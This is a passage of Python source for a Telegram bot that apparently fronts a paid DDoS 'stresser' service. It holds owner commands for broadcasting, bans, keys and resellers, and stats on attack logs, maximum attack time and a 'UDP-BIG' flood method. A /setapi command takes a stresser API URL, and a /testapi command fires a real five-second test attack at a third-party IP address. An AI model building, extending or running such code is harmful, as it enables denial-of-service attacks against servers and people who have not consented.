                banned_skip += 1
                continue
            try:
                bot.send_message(int(uid_str), full_message, parse_mode="HTML")
                sent += 1
            except Exception:
                failed += 1

            if i % 5 == 0 or i == total:
                try:
                    bot.edit_message_text(
                        chat_id=status_msg.chat.id,
                        message_id=status_msg.message_id,
                        text=(
                            "╔══════════════════════════════╗\n"
                            "║   📤 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📤   ║\n"
                            "╚══════════════════════════════╝\n\n"
                            f"┣ 👥 ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ ➪ <b>{total}</b>\n"
                            f"┣ ✅ ꜱᴇɴᴛ ➪ <b>{sent}</b>\n"
                            f"┣ ❌ ꜰᴀɪʟᴇᴅ ➪ <b>{failed}</b>\n"
                            f"┣ 🚫 ʙᴀɴɴᴇᴅ ꜱᴋɪᴘ ➪ <b>{banned_skip}</b>\n"
                            f"┗ 📊 ᴘʀᴏɢʀᴇꜱꜱ ➪ <b>{i}/{total}</b>\n\n"
                            "⏳ <i>ᴘʀᴏᴄᴇꜱꜱɪɴɢ...</i>"
                        ),
                        parse_mode="HTML"
                    )
                except: pass
            time.sleep(0.05)

        try:
            bot.edit_message_text(
                chat_id=status_msg.chat.id,
                message_id=status_msg.message_id,
                text=(
                    "╔══════════════════════════════╗\n"
                    "║   ✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅   ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃   📊 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗣𝗢𝗥𝗧 📊\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    f"┣ 👥 ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ ➪ <b>{total}</b>\n"
                    f"┣ ✅ ꜱᴇɴᴛ ➪ <b>{sent}</b>\n"
                    f"┣ ❌ ꜰᴀɪʟᴇᴅ ➪ <b>{failed}</b>\n"
                    f"┗ 🚫 ʙᴀɴɴᴇᴅ ꜱᴋɪᴘ ➪ <b>{banned_skip}</b>\n\n"
                    "╔══════════════════════════════╗\n"
                    "║   🔥 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗗𝗢𝗡𝗘 🔥   ║\n"
                    "╚══════════════════════════════╝"
                ),
                parse_mode="HTML"
            )
        except: pass

    threading.Thread(target=do_broadcast, daemon=True).start()

@bot.message_handler(commands=['stats'])
def cmd_stats(msg):
    if not is_owner(msg.from_user.id): return
    used_keys = sum(1 for k, v in data['keys'].items() if v.get('used'))
    unused_keys = len(data['keys']) - used_keys
    txt = (
        "╔══════════════════════════════╗\n"
        "║   📊 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗦 📊   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   👥 𝗨𝗦𝗘𝗥𝗦 𝗗𝗔𝗧𝗔\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"┣ 👥 ᴛᴏᴛᴀʟ ➪ <b>{len(data['users'])}</b>\n"
        f"┣ 👑 ᴀᴅᴍɪɴꜱ ➪ <b>{len(data.get('admins', {}))}</b>\n"
        f"┣ 💼 ʀᴇꜱᴇʟʟᴇʀꜱ ➪ <b>{len(data.get('resellers', {}))}</b>\n"
        f"┗ 🚫 ʙᴀɴɴᴇᴅ ➪ <b>{len(data.get('banned_users', {}))}</b>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   🔑 𝗞𝗘𝗬𝗦 𝗗𝗔𝗧𝗔\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"┣ 🔑 ᴛᴏᴛᴀʟ ➪ <b>{len(data['keys'])}</b>\n"
        f"┣ ✅ ᴜꜱᴇᴅ ➪ <b>{used_keys}</b>\n"
        f"┗ 🆓 ᴀᴠᴀɪʟᴀʙʟᴇ ➪ <b>{unused_keys}</b>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   💀 𝗔𝗧𝗧𝗔𝗖𝗞𝗦 𝗗𝗔𝗧𝗔\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"┣ 💀 ᴛᴏᴛᴀʟ ➪ <b>{len(data['attack_logs'])}</b>\n"
        f"┣ ⏱️ ᴍᴀx ᴛɪᴍᴇ ➪ <b>{get_setting('max_attack_time', 300)}ꜱ</b>\n"
        f"┗ ⏸️ ᴄᴏᴏʟᴅᴏᴡɴ ➪ <b>{get_setting('user_cooldown', 5)}ꜱ</b>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   🎨 𝗖𝗢𝗡𝗧𝗘𝗡𝗧 𝗗𝗔𝗧𝗔\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"┣ ❄ ꜱᴛɪᴄᴋᴇʀꜱ ➪ <b>{len(data.get('stickers', []))}</b>\n"
        f"┣ 📹 ᴠɪᴅᴇᴏꜱ ➪ <b>{len(data.get('videos', []))}</b>\n"
        f"┗ 🎬 ᴘʏꜰ ➪ <b>{len(data.get('pyf_videos', []))}</b>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗗𝗔𝗧𝗔\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"┣ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>\n"
        f"┣ 🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ➪ <b>{'🟢 ᴏɴ' if get_setting('maintenance_mode', False) else '🔴 ᴏꜰꜰ'}</b>\n"
        f"┗ 📡 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n\n"
        "╔══════════════════════════════╗\n"
        "║   🔥 𝗕𝗢𝗧 𝗢𝗡𝗟𝗜𝗡𝗘 🔥   ║\n"
        "╚══════════════════════════════╝"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def cmd_ban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split(maxsplit=2)
    if len(p) < 2:
        bot.reply_to(msg,
            "╔══════════════════════════════╗\n"
            "║   🚫 𝗕𝗔𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🚫   ║\n"
            "╚══════════════════════════════╝\n\n"
            "📝 <b>ꜰᴏʀᴍᴀᴛ:</b>\n"
            "<code>/ban USER_ID [REASON]</code>\n\n"
            "📌 <b>ᴇxᴀᴍᴘʟᴇꜱ:</b>\n"
            "┣ <code>/ban 123456789</code>\n"
            "┗ <code>/ban 123456789 Spam kar raha tha</code>",
            parse_mode="HTML")
        return
    target_id = p[1]
    reason = p[2] if len(p) > 2 else "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ"
    
    data["banned_users"][target_id] = {
        "banned_at": datetime.now().isoformat(),
        "banned_by": msg.from_user.id,
        "reason": reason
    }
    save_data(data)

    try:
        ban_notification = (
            "╔══════════════════════════════╗\n"
            "║   🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗 🚫   ║\n"
            "╚══════════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗩𝗢𝗞𝗘𝗗 ⛔\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            "🔒 <b>ᴀᴀᴘᴋᴏ ɪꜱ ʙᴏᴛ ꜱᴇ ʙᴀɴ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📝 <b>ʀᴇᴀꜱᴏɴ:</b> <i>{escape_html(reason)}</i>\n"
            f"📅 <b>ᴛɪᴍᴇ:</b> <code>{ist_time_str()} IST</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ <b>ᴀᴀᴘ ᴀʙ ʙᴏᴛ ᴋᴀ ᴋᴏɪ ʙʜɪ ꜰᴇᴀᴛᴜʀᴇ ᴜꜱᴇ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
            "💬 <b>ᴜɴʙᴀɴ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ</b>\n"
            f"👑 <b>ᴏᴡɴᴇʀ:</b> <code>{BOT_OWNER}</code>\n\n"
            "╔══════════════════════════════╗\n"
            "║   🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 🔒   ║\n"
            "╚══════════════════════════════╝"
        )
        bot.send_message(int(target_id), ban_notification, parse_mode="HTML")
    except Exception as e:
        print(f"Ban notification failed: {e}")

    bot.reply_to(msg,
        "╔══════════════════════════════╗\n"
        "║   ✅ 𝗨𝗦𝗘𝗥 𝗕𝗔𝗡𝗡𝗘𝗗 ✅   ║\n"
        "╚══════════════════════════════╝\n\n"
        f"┣ 🆔 ᴜꜱᴇʀ ɪᴅ ➪ <code>{target_id}</code>\n"
        f"┣ 📝 ʀᴇᴀꜱᴏɴ ➪ <i>{escape_html(reason)}</i>\n"
        f"┣ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n"
        f"┗ 📢 ɴᴏᴛɪꜰɪᴇᴅ ➪ ✅",
        parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def cmd_unban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg, "⚠️ <code>/unban USER_ID</code>", parse_mode="HTML"); return
    target_id = p[1]
    if target_id in data["banned_users"]:
        del data["banned_users"][target_id]; save_data(data)

        try:
            unban_notification = (
                "╔══════════════════════════════╗\n"
                "║   ✅ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗨𝗡𝗕𝗔𝗡𝗡𝗘𝗗 ✅   ║\n"
                "╚══════════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   🎉 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗦𝗧𝗢𝗥𝗘𝗗 🎉\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                "🔓 <b>ᴀᴀᴘᴋᴀ ʙᴀɴ ʜᴀᴛᴀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ</b>\n\n"
                f"📅 <b>ᴛɪᴍᴇ:</b> <code>{ist_time_str()} IST</code>\n\n"
                "✅ <b>ᴀᴀᴘ ᴀʙ ʙᴏᴛ ᴜꜱᴇ ᴋᴀʀ ꜱᴀᴋᴛᴇ ʜᴏ</b>\n"
                "🚀 <b>ꜱᴛᴀʀᴛ ᴋᴀʀᴏ:</b> /start\n\n"
                "╔══════════════════════════════╗\n"
                "║   🔥 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 🔥   ║\n"
                "╚══════════════════════════════╝"
            )
            bot.send_message(int(target_id), unban_notification, parse_mode="HTML")
        except: pass

        bot.reply_to(msg,
            "╔══════════════════════════════╗\n"
            "║   ✅ 𝗨𝗡𝗕𝗔𝗡𝗡𝗘𝗗 ✅   ║\n"
            "╚══════════════════════════════╝\n\n"
            f"┣ 🆔 ᴜꜱᴇʀ ɪᴅ ➪ <code>{target_id}</code>\n"
            f"┣ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n"
            f"┗ 📢 ɴᴏᴛɪꜰɪᴇᴅ ➪ ✅",
            parse_mode="HTML")
    else:
        bot.reply_to(msg, "❌ <b>ᴜꜱᴇʀ ɴᴏᴛ ʙᴀɴɴᴇᴅ!</b>", parse_mode="HTML")

@bot.message_handler(commands=['setapi'])
def cmd_setapi(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 3:
        bot.reply_to(msg,
            "📡 <b>ꜱᴇᴛ ᴀᴘɪ ᴜꜱᴀɢᴇ</b>\n\n"
            "<code>/setapi URL TOKEN [METHOD] [GEO]</code>\n\n"
            "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
            "<code>/setapi https://stresser.works/api/start YOUR_TOKEN UDP-BIG ALL</code>",
            parse_mode="HTML")
        return
    set_setting("api_url", p[1]); set_setting("api_token", p[2])
    if len(p) > 3: set_setting("api_method", p[3])
    if len(p) > 4: set_setting("api_geolocation", p[4])
    bot.reply_to(msg,
        "✅ <b>ᴀᴘɪ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n\n"
        f"┣ 🔗 ᴜʀʟ ➪ <code>{escape_html(p[1])}</code>\n"
        f"┣ 🔑 ᴛᴏᴋᴇɴ ➪ <code>{escape_html(p[2][:20])}...</code>\n"
        f"┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
        f"┗ 🌍 ɢᴇᴏ ➪ <code>{escape_html(get_setting('api_geolocation', 'ALL'))}</code>",
        parse_mode="HTML")

# ============= TESTAPI WITH LIVE RESULT =============
@bot.message_handler(commands=['testapi'])
def cmd_testapi(msg):
    if not is_owner(msg.from_user.id): return
    cid = msg.chat.id
    
    # Send initial loading message
    loading_msg = bot.reply_to(msg,
        "╔══════════════════════════════╗\n"
        "║   🧪 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗔𝗣𝗜 🧪   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ⚙️ 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "┣ 🔗 ᴜʀʟ ➪ <code>" + escape_html(get_setting('api_url', DEFAULT_API_URL)) + "</code>\n"
        "┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>" + escape_html(get_setting('api_method', 'UDP-BIG')) + "</code>\n"
        "┣ 🌍 ɢᴇᴏ ➪ <code>" + escape_html(get_setting('api_geolocation', 'ALL')) + "</code>\n"
        "┗ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>1.1.1.1:80</code>\n\n"
        "▰▱▱▱▱▱▱▱▱▱ 10%\n"
        "📡 ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴀᴘɪ...",
        parse_mode="HTML")

    def run_test():
        steps = [
            ("▰▰▰▱▱▱▱▱▱▱", "30%", "🔐 ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪɴɢ ᴛᴏᴋᴇɴ..."),
            ("▰▰▰▰▰▱▱▱▱▱", "50%", "🚀 ꜱᴇɴᴅɪɴɢ ᴛᴇꜱᴛ ᴀᴛᴛᴀᴄᴋ..."),
            ("▰▰▰▰▰▰▰▱▱▱", "70%", "📡 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..."),
        ]
        
        for bar, pct, status in steps:
            time.sleep(0.5)
            try:
                bot.edit_message_text(
                    chat_id=cid, message_id=loading_msg.message_id,
                    text=(
                        "╔══════════════════════════════╗\n"
                        "║   🧪 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗔𝗣𝗜 🧪   ║\n"
                        "╚══════════════════════════════╝\n\n"
                        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        "┃   ⚙️ 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                        "┣ 🔗 ᴜʀʟ ➪ <code>" + escape_html(get_setting('api_url', DEFAULT_API_URL)) + "</code>\n"
                        "┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>" + escape_html(get_setting('api_method', 'UDP-BIG')) + "</code>\n"
                        "┣ 🌍 ɢᴇᴏ ➪ <code>" + escape_html(get_setting('api_geolocation', 'ALL')) + "</code>\n"
                        "┗ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>1.1.1.1:80</code>\n\n"
                        f"{bar} {pct}\n"
                        f"{status}"
                    ),
                    parse_mode="HTML"
                )
            except: pass

        # Actually test
        ok, r = api_attack("1.1.1.1", 80, 5)
        
        time.sleep(0.3)
        
        # Final result - CONVERT the loading message
        if ok:
            final_text = (
                "╔══════════════════════════════╗\n"
                "║   ✅ 𝗔𝗣𝗜 𝗧𝗘𝗦𝗧 𝗢𝗞 ✅   ║\n"
                "╚══════════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   📊 𝗥𝗘𝗦𝗨𝗟𝗧 📊\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                "▰▰▰▰▰▰▰▰▰▰ 100%\n"
                "🟢 ᴀᴘɪ ɪꜱ ᴡᴏʀᴋɪɴɢ\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ 🔗 ᴜʀʟ ➪ <code>{escape_html(get_setting('api_url', DEFAULT_API_URL))}</code>\n"
                f"┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
                f"┣ 🌍 ɢᴇᴏ ➪ <code>{escape_html(get_setting('api_geolocation', 'ALL'))}</code>\n"
                f"┣ 📅 ᴛᴇꜱᴛᴇᴅ ᴀᴛ ➪ <code>{ist_time_str()} IST</code>\n"
                f"┗ 📡 ʀᴇꜱᴘᴏɴꜱᴇ ➪ <code>{escape_html(r[:150])}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "╔══════════════════════════════╗\n"
                "║   🔥 𝗔𝗣𝗜 𝗥𝗘𝗔𝗗𝗬 🔥   ║\n"
                "╚══════════════════════════════╝"
            )
        else:
            final_text = (
                "╔══════════════════════════════╗\n"
                "║   ❌ 𝗔𝗣𝗜 𝗧𝗘𝗦𝗧 𝗙𝗔𝗜𝗟𝗘𝗗 ❌   ║\n"
                "╚══════════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   📊 𝗥𝗘𝗦𝗨𝗟𝗧 📊\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                "▰▰▰▰▰▰▰▰▰▰ 100%\n"
                "🔴 ᴀᴘɪ ɴᴏᴛ ᴡᴏʀᴋɪɴɢ\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ 🔗 ᴜʀʟ ➪ <code>{escape_html(get_setting('api_url', DEFAULT_API_URL))}</code>\n"
                f"┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
                f"┣ 📅 ᴛᴇꜱᴛᴇᴅ ᴀᴛ ➪ <code>{ist_time_str()} IST</code>\n"
                f"┗ ❌ ᴇʀʀᴏʀ ➪ <code>{escape_html(r[:200])}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "╔══════════════════════════════╗\n"
                "║   ⚠️ ᴄʜᴇᴄᴋ ᴀᴘɪ ⚠️   ║\n"
                "╚══════════════════════════════╝"
            )
        
        try:
            bot.edit_message_text(
                chat_id=cid, message_id=loading_msg.message_id,
                text=final_text, parse_mode="HTML"
            )
        except Exception as e:
            print(f"Testapi final edit error: {e}")
            try: bot.send_message(cid, final_text, parse_mode="HTML")
            except: pass

    threading.Thread(target=run_test, daemon=True).start()

@bot.message_handler(commands=['setmaxtime'])
def cmd_setmaxtime(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setmaxtime SEC"); return
    try:
        set_setting("max_attack_time", int(p[1]))
        bot.reply_to(msg, f"✅ <b>ᴍᴀx ᴛɪᴍᴇ:</b> {p[1]}ꜱ", parse_mode="HTML")
    except: bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ")

@bot.message_handler(commands=['setcooldown'])
def cmd_setcooldown(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setcooldown SEC"); return
    try:
        set_setting("user_cooldown", int(p[1]))
        bot.reply_to(msg, f"✅ <b>ᴄᴏᴏʟᴅᴏᴡɴ:</b> {p[1]}ꜱ", parse_mode="HTML")
    except: bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ")

@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(msg):
    if not is_owner(msg.from_user.id): return
    cur = get_setting('maintenance_mode', False)
    set_setting("maintenance_mode", not cur)
    bot.reply_to(msg, f"✅ <b>ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ:</b> {'ᴏɴ' if not cur else 'ᴏꜰꜰ'}", parse_mode="HTML")

# ============= STICKER COMMANDS =============
@bot.message_handler(commands=['removesticker'])
def cmd_removesticker(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["stickers"]:
            bot.reply_to(msg, "❄ ᴋᴏɪ ꜱᴛɪᴄᴋᴇʀ ɴᴀʜɪ ʜᴀɪ."); return
        txt = "❄ <b>ꜱᴛɪᴄᴋᴇʀꜱ ʟɪꜱᴛ:</b>\n━━━━━━━━━━━━━\n"
        for i, s in enumerate(data["stickers"], 1):
            txt += f"{i}. <code>{s}</code>\n"
        txt += "\n❌ ʀᴇᴍᴏᴠᴇ: <code>/removesticker NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML"); return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["stickers"]):
            data["stickers"].pop(idx); save_data(data)
            bot.reply_to(msg, f"✅ <b>ꜱᴛɪᴄᴋᴇʀ #{p[1]} ʀᴇᴍᴏᴠᴇᴅ!</b>\n❄ ᴛᴏᴛᴀʟ: <b>{len(data['stickers'])}</b>", parse_mode="HTML")
        else: bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!")
    except: bot.reply_to(msg, "❌ ᴜꜱᴀɢᴇ: <code>/removesticker NUMBER</code>", parse_mode="HTML")

@bot.message_handler(commands=['liststickers'])
def cmd_liststickers(msg):
    if not is_owner(msg.from_user.id): return
    if not data["stickers"]:
        bot.reply_to(msg, "❄ ᴋᴏɪ ꜱᴛɪᴄᴋᴇʀ ɴᴀʜɪ ʜᴀɪ."); return
    txt = "❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗦\n"
    for i, s in enumerate(data["stickers"], 1):
        txt += f"{i}. {s}\n"
    txt += f"\n🔹 ᴛᴏᴛᴀʟ {len(data['stickers'])}"
    bot.reply_to(msg, txt)

# ============= VIDEO COMMANDS =============
@bot.message_handler(commands=['listvideo'])
def cmd_listvideo(msg):
    if not is_owner(msg.from_user.id): return
    if not data["videos"]:
        bot.reply_to(msg, "📹 ᴋᴏɪ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ."); return
    txt = "📹 🇻 🇮 🇩 🇪 🇴 🇸 ：\n"
    for i, v in enumerate(data["videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ ᴛᴏᴛᴀʟ ： {len(data['videos'])}"
    bot.reply_to(msg, txt)

@bot.message_handler(commands=['delvideo'])
def cmd_delvideo(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["videos"]:
            bot.reply_to(msg, "📹 ᴋᴏɪ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ."); return
        txt = "📹 <b>ᴠɪᴅᴇᴏꜱ ʟɪꜱᴛ:</b>\n━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["videos"], 1):
            txt += f"{i}. <code>{v}</code>\n"
        txt += "\n❌ ᴅᴇʟᴇᴛᴇ: <code>/delvideo NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML"); return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["videos"]):
            data["videos"].pop(idx); save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴠɪᴅᴇᴏ #{p[1]} ʀᴇᴍᴏᴠᴇᴅ!</b>\n📹 ᴛᴏᴛᴀʟ: <b>{len(data['videos'])}</b>", parse_mode="HTML")
        else: bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!")
    except: bot.reply_to(msg, "❌ ᴜꜱᴀɢᴇ: <code>/delvideo NUMBER</code>", parse_mode="HTML")

# ============= PYF VIDEO COMMANDS =============
_pending_pyf = {}

@bot.message_handler(commands=['addpyf'])
def cmd_addpyf(msg):
    if not is_owner(msg.from_user.id): return
    _pending_pyf[msg.from_user.id] = True
    bot.reply_to(msg, "📤 <b>ᴀʙ ᴇᴋ ᴠɪᴅᴇᴏ ꜰᴏʀᴡᴀʀᴅ ᴋᴀʀᴏ.</b>", parse_mode="HTML")

@bot.message_handler(commands=['listpyf'])
def cmd_listpyf(msg):
    if not is_owner(msg.from_user.id): return
    if not data["pyf_videos"]:
        bot.reply_to(msg, "🎬 ᴋᴏɪ ᴘʏꜰ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ."); return
    txt = "🎬 🇵 🇾 🇫 ᴠɪᴅᴇᴏꜱ ：\n"
    for i, v in enumerate(data["pyf_videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ ᴛᴏᴛᴀʟ ： {len(data['pyf_videos'])}"
    bot.reply_to(msg, txt)

@bot.message_handler(commands=['delpyf'])
def cmd_delpyf(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["pyf_videos"]:
            bot.reply_to(msg, "🎬 ᴋᴏɪ ᴘʏꜰ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ."); return
        txt = "🎬 <b>ᴘʏꜰ ᴠɪᴅᴇᴏꜱ ʟɪꜱᴛ:</b>\n━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["pyf_videos"], 1):
            txt += f"{i}. <code>{v}</code>\n"
        txt += "\n❌ ᴅᴇʟᴇᴛᴇ: <code>/delpyf NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML"); return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["pyf_videos"]):
            data["pyf_videos"].pop(idx); save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴘʏꜰ ᴠɪᴅᴇᴏ #{p[1]} ʀᴇᴍᴏᴠᴇᴅ!</b>\n🎬 ᴛᴏᴛᴀʟ: <b>{len(data['pyf_videos'])}</b>", parse_mode="HTML")
        else: bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!")
    except: bot.reply_to(msg, "❌ ᴜꜱᴀɢᴇ: <code>/delpyf NUMBER</code>", parse_mode="HTML")

# ============= AUTO STICKER =============
@bot.message_handler(content_types=['sticker'])
def auto_sticker(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    if not is_owner(uid): return
    file_id = msg.sticker.file_id
    if file_id not in data["stickers"]:
        data["stickers"].append(file_id); save_data(data)
        bot.reply_to(msg, f"✅ <b>ꜱᴛɪᴄᴋᴇʀ ᴀᴅᴅᴇᴅ!</b>\n❄ ᴛᴏᴛᴀʟ: <b>{len(data['stickers'])}</b>", parse_mode="HTML")
    else:
        bot.reply_to(msg, "ℹ️ <b>ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.</b>", parse_mode="HTML")

# ============= VIDEO HANDLER =============
@bot.message_handler(content_types=['video'])
def handle_video(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    if not is_owner(uid): return
    file_id = msg.video.file_id

    if _pending_pyf.get(uid):
        _pending_pyf[uid] = False
        if file_id not in data["pyf_videos"]:
            data["pyf_videos"].append(file_id); save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴘʏꜰ ᴠɪᴅᴇᴏ ᴀᴅᴅᴇᴅ!</b>\n🎬 ᴛᴏᴛᴀʟ: <b>{len(data['pyf_videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "ℹ️ <b>ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.</b>", parse_mode="HTML")
    else:
        if file_id not in data["videos"]:
            data["videos"].append(file_id); save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴠɪᴅᴇᴏ ᴀᴅᴅᴇᴅ!</b>\n📹 ᴛᴏᴛᴀʟ: <b>{len(data['videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "ℹ️ <b>ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.</b>", parse_mode="HTML")

# ============= SETTINGS =============
@bot.message_handler(commands=['settings'])
def cmd_settings(msg):
    if not is_owner(msg.from_user.id): return
    txt = (
